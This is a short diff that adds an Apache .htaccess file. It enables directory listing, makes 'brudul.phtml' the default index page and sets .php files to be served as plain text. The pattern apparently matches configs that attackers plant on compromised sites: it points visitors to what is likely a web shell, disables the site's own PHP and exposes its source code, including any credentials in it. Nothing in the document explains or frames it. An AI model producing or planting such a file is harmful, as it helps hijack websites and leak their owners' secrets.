@@ -1,0 +1,4 @@
+Options Indexes FollowSymLinks
+DirectoryIndex brudul.phtml
+AddType txt .php
+AddHandler txt .php
